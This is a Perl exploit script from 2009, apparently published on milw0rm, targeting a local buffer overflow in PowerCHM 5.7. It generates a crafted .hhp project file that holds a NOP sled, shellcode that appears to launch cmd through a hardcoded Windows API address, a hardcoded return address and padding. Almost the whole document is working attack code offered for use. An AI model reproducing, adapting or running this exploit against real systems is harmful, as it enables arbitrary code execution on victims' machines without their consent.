#!/usr/bin/perl
#
# Title: PowerCHM 5.7 (hhp) Local Buffer Overflow Exploit
#
# Summary: With PowerCHM you can create your CHM files
# automatically from Html Files (including .htm, .html
# and .mht), Text Files (.txt), Microsoft Word Documents
# (.doc) and Adobe Acrobat Document (.pdf).
#
# Product web page: http://www.dawningsoft.com/products/powerchm.htm
#
# Tested on WinXP Pro SP2 (English)
#
# Refs:	http://www.milw0rm.com/exploits/8300
#	http://security.biks.vn/?p=365
#
# Exploit by Gjoko 'LiquidWorm' Krstic
#
# liquidworm gmail com
#
# http://www.zeroscience.org/
#
# 28.03.2009
#

my $header="
	[OPTIONS]\n
	Compatibility=1.1 or later\n
	Compiled file=zero.chm\n
	Contents file=science.hhc\n
	Index file=lqwrm.hhk\n
	Binary Index=Yes\n
	Language=0x042F\n
	Title=\n
	Error log file=Errlog.txt\n
	Default Window=main\n\n
	[WINDOWS]\n
	main='',science.hhc,lqwrm.hhk,'','',,,,,0x41520,240,0x184E,[262,184,762,584],,,,0,0,0,0\n\n
	[FILES]\n\n
	[INFOTYPES]\n
	";


my $sc ="\x8B\xEC\x33\xFF\x57\xC6\x45\xFC\x63\xC6\x45".
	"\xFD\x6D\xC6\x45\xFE\x64\xC6\x45\xF8\x01\x8D".
	"\x45\xFC\x50\xB8\xC7\x93\xBF\x77\xFF\xD0";


my $bof = "\x90" x 568 . "$sc" . "\x41" x 400 . "\xe8\xed\x12\x00" . "\x42" x 500;

my $file = "Watchmen.hhp";
open (hhp, ">./$file") || die "\nCan't open $file: $!";
print hhp "$header" . "$bof";
close (hhp);
sleep 1;
print "\nFile $file successfully created!\n";

# milw0rm.com [2009-03-29]
